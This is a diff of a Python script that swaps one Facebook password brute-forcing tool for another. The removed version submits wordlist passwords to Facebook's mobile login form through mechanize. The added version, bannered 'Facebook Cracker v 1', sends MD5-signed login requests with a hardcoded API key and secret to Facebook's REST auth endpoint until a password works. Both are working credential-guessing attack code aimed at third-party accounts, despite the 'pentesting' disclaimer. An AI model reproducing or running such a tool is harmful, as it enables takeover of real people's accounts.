@@ -1,63 +1,55 @@
-# coding: utf8
-import sys,time,os,mechanize
-import cookielib
-def restart():
-   python = sys.executable
-   os.execl(python, python, * sys.argv)
-   curdir = os.getcwd()
-##############################
-# Set Colors ######
-N = '\033[0m'
-W = '\033[1;37m'
-B = '\033[1;34m'
-R = '\033[1;31m'
-G = '\033[1;32m'
-Y = '\033[1;33m'
-C = '\033[1;36m'
-##################
-os.system("clear")
-line="%s---------------"%(B)
-os.system("figlet fbrute | lolcat")
-print line
-print "%sAuthor: %AlvahRozi"%(Y,G)
-print "%sContact: %s+6289505649048"%(Y,G)
-print line
-try:
-	id=sys.argv[1]
-	sandi=sys.argv[2]
-except:
-	print "%s[!]%s Error Cek You Parameter%s"%(Y,R,N)
-	sys.exit()
+## fbbrute.py - Facebook Brute Force
+# -*- coding: utf-8 -*-
 ##
+import os
+import sys
+import urllib
+import hashlib
+
+API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
+
+__banner__ = """
+       +=======================================+
+       |..........Facebook Cracker v 1.........|
+       +---------------------------------------+
+       |#Author: DedSecTL <dtlily>             |
+       |#Contact: Telegram @dtlily             |
+       |#Date: Fri Feb 8 10:15:49 2019         |
+       |#This tool is made for pentesting.     |
+       |#Changing the description of this tool |
+       |Won't made you the coder ^_^ !!!       |
+       |#Respect Coderz ^_^                    |
+       |#I take no responsibilities for the    |
+       |  use of this program !                |
+       +=======================================+
+       |..........Facebook Cracker v 1.........|
+       +---------------------------------------+
+"""
+
+print("[+] Facebook Brute Force\n")
+userid = raw_input("[*] Enter [Email|Phone|Username|ID]: ")
 try:
-	pw=open(sandi,"r+")
-except:
-	print "%s[!]%s Error Cek You Pasword Path%s"%(Y,R,N)
-	
-akmj = "https://m.facebook.com"
-print "%s[!]%sCTRL+Z To Exit"%(R,G)
-to=1
-cj = cookielib.LWPCookieJar()
-for pasw in pw.readlines():
-		pasw = pasw.strip("\n")
-		print "%s[!]%sAttempt => %i"%(Y,G,to)
-		mech=mechanize.Browser()
-		mech.set_handle_robots(False)
-		mech.set_handle_redirect(True)
-		mech.set_handle_referer(True)
-		mech.set_handle_equiv(True)
-		mech.set_cookiejar(cj)
-		mech.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-		mech.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
-		mech.open(akmj)
-		mech.select_form(nr=0)
-		mech.form["email"]=id
-		mech.form["pass"]=pasw
-		mech.submit()
-		text=mech.geturl()
-		to += 1
-		if "save-device" in text or  "m_sess" in text:
-			print "%s[*]%sOK => %s"%(Y,G,pasw)
-			sys.exit()
-		else:
-			print "%s[#]%sFAILED => %s"%(Y,R,pasw)
+	passlist = raw_input("[*] Set PATH to passlist: ")
+	if os.path.exists(passlist) != False:
+		print(__banner__)
+		print(" [+] Account to crack : {}".format(userid))
+		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
+		print(" [+] Cracking, please wait ...")
+		for passwd in open(passlist,'r').readlines():
+			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
+			sys.stdout.flush()
+			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
+			xx = hashlib.md5(sig).hexdigest()
+			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
+			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
+			if "error" in response:
+				pass
+			else:
+				print("\n\n[+] Password found .. !!")
+				print("\n[+] Password : {}".format(passwd.strip()))
+				break
+		print("\n\n[!] Done .. !!")
+	else:
+		print("fbbrute: error: No such file or directory")
+except KeyboardInterrupt:
+	print("fbbrute: error: Keyboard interrupt")
